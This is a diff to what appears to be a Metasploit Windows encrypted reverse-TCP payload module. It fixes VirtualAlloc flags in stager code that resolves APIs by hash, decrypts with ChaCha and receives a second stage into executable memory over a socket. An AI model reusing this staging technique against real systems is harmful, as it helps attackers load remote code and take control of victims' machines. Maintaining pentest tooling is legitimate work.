@@ -264,7 +264,7 @@ module Payload::Windows::EncryptedReverseTcp
       char *chacha_data(char *buf, int len, chacha_ctx *ctx)
         {
           FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
-          char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_READWRITE);
+          char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
           chacha_encrypt_bytes(ctx, buf, out, len);
           out[len] = '\\0';
           return out;
@@ -346,7 +346,7 @@ module Payload::Windows::EncryptedReverseTcp
         FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
         FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')});
 
-        char *received = VirtualAlloc(NULL, 45, MEM_COMMIT, PAGE_READWRITE);
+        char *received = VirtualAlloc(NULL, 45, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         int recv_num = RecvData(s, received, 44, 0);
 
         received[44] = '\\0';
@@ -567,7 +567,7 @@ module Payload::Windows::EncryptedReverseTcp
         }
 
         FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll', 'VirtualAlloc') -> 0xe553a458
-        register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
         int recv_stg = RecvData(conn_socket, received, stage_size, MSG_WAITALL);
         if(recv_stg != stage_size)
